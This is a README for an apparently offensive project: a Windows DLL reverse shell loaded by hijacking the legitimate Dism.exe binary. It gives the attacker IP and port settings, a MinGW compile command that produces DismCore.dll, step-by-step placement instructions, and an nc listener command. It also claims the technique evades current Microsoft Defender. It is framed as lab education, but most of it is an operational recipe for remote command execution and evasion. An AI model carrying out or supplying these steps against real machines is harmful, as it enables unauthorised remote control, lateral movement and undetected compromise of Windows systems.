# Windows DLL Reverse Shell – Dism.exe Hijacking Demo

A minimal Windows DLL that establishes a reverse TCP shell connection to a specified host and port.
Used in a controlled lab to demonstrate **DLL hijacking** through the legitimate Windows binary `Dism.exe`.

## Overview

This DLL connects back to a remote listener and redirects the `cmd.exe` process I/O through the socket, providing remote command execution over TCP.
When placed in the same directory as `Dism.exe`, the process will automatically load it on startup, triggering the reverse shell.

## Configuration

Edit the following values in the source before compilation:

```c
#define REVERSEIP "127.0.0.1"
#define REVERSEPORT 5151
```

Replace them with the attacker's IP and listening port.

## Compilation

Compile using MinGW:

```bash
x86_64-w64-mingw32-gcc -shared reverse_shell.c -o DismCore.dll -lws2_32
```

## DLL Hijacking Demonstration

1. Copy the legitimate binary **`C:\Windows\System32\Dism.exe`** to any writable directory (e.g. Desktop or a test folder).
2. Place the compiled reverse shell DLL in that same folder and **name it exactly `DismCore.dll`**.
3. Start a listener on your attack machine:

   ```bash
   nc -lvnp 5151
   ```
4. Execute the copied `Dism.exe`.
   It will attempt to load `DismCore.dll` from the current directory, find yours, and execute it.
   The reverse shell will connect back to your listener.

## Compatibility

Tested successfully on **Windows 11 (build 26100+)** with **Microsoft Defender (latest version, 2025)**.
The demonstration works without immediate detection, showing how DLL search order can be exploited for local privilege abuse or lateral movement scenarios.

## Notes

This project is for **educational and research purposes only**.
Do not deploy or distribute outside of controlled, authorized environments.

---
